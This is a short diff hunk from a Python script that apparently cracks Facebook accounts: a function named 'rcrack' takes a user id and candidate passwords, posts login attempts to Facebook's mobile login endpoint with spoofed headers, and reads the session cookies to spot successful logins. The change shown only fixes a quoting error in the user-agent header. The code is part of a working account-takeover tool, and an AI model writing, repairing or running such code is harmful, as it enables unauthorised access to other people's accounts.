@@ -252,7 +252,7 @@ def rcrack(uid,pwx,tl):
 
             'upgrade-insecure-requests': '1',
 
-            'user-agent': pro',}
+            'user-agent': pro,}
 			lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			#print(iid+'|'+pws+'|'+str(log_cookies))
